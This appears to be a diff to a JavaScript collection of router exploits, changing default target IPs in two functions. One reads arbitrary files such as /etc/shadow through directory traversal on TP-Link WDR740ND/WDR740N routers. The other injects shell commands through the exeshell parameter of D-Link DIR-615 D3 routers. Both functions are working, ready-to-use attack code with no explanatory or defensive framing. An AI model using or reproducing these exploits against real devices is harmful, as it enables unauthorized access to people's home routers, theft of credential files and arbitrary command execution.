@@ -1115,8 +1115,7 @@ function wrtadminr() {
 // TP-Link WDR740ND/WDR740N - Directory Traversal
 function wdr740_dirtraversal(ip)
 {
-
-	ip = ip || "192.168.1.254";
+	ip = ip || "192.168.0.1";
 	path = prompt("Path: (ex: /etc/shadow)");
 	document.location = "http://" + ip + "/help/../../../../../../../../../../../../../../../.." + path;
 }
@@ -1124,7 +1123,7 @@ function wdr740_dirtraversal(ip)
 // D-Link DIR-615 D3 - Remote Command Execution
 function d615d3_commandexec(ip)
 {
-	ip = ip || "192.168.178.155";
+	ip = ip || "192.168.0.1";
 	cmd = prompt("Command:");
 	url = "/tools_system.xgi?random_num=2012.8.24.13.34.33&exeshell=submit%20` " + cmd + "` ";
 	document.location="http://"+ip+url;
